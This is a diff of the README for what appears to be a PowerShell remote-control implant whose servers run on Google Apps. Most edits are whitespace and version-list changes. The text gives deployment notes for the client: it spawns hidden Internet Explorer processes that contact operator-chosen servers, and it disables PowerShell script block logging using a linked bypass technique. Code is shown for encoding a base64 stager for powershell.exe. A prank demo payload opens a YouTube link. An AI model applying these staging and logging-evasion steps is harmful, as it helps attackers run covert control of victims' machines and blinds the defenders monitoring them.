@@ -1,11 +1,11 @@
 ## Client Support
 
-![Windows-Tested](https://img.shields.io/static/v1?label=Windows%20%28Tested%29&message=10&color=success&logo=windows&style=flat-square&logoColor=cyan) ![Windows-Untested](https://img.shields.io/static/v1?label=Windows%20%28Untested%29&message=8%2C%207%2C%20Vista%2C%20XP%2c%20Windows%20Server%20%28any%29&color=important&logo=windows&style=flat-square&logoColor=cyan) 
+![Windows-Tested](https://img.shields.io/static/v1?label=Windows%20%28Tested%29&message=10%2C%207&color=success&logo=windows&style=flat-square&logoColor=cyan) ![Windows-Untested](https://img.shields.io/static/v1?label=Windows%20%28Untested%29&message=8%2C%20Vista%2C%20XP%2c%20Windows%20Server%20%28any%29&color=important&logo=windows&style=flat-square&logoColor=cyan)
 
 ## Deployment Notes
 
-- Since PowerShell is an interpreted language, `client.ps1` is written to limit payload size. 
-- The client uses the [InternetExplorer COM Interface](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752084(v%3Dvs.85)) in PowerShell to create hidden InternetExplorer processes that reach out to the Google Apps Servers in the background. 
+- Since PowerShell is an interpreted language, `client.ps1` is written to limit payload size.
+- The client uses the [InternetExplorer COM Interface](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752084(v%3Dvs.85)) in PowerShell to create hidden InternetExplorer processes that reach out to the Google Apps Servers in the background.
 - The client disables _<u>process local</u>_ PowerShell script block logging using the technique outlined [here](https://cobbr.io/ScriptBlock-Logging-Bypass.html) first before continuing client execution.
 - Add your Google Apps Server URLs to the `$SRV` array variable in `client.ps1`. The client will cycle through the array to load balance server connections.
 - Run the following PowerShell to generate a payload:
@@ -51,8 +51,8 @@ $text = [system.text.encoding]::utf8.getstring($utf8);
 $text = $text.replace("`n","").replace("`r","");
 # convert from UTF8 to Unicode (PowerShell.exe needs base64 Unicode)
 $unicode = [system.text.encoding]::convert(
-    [system.text.encoding]::utf8, 
-    [system.text.encoding]::unicode, 
+    [system.text.encoding]::utf8,
+    [system.text.encoding]::unicode,
     [system.text.encoding]::utf8.getbytes($text));
 # output base64 stager
 [system.convert]::tobase64string($unicode);
@@ -92,7 +92,7 @@ End Sub
 
 ```powershell
 (new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom');
-$e=new-object -com internetexplorer.application; 
+$e=new-object -com internetexplorer.application;
 $e.visible=$true;
 $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
 ```
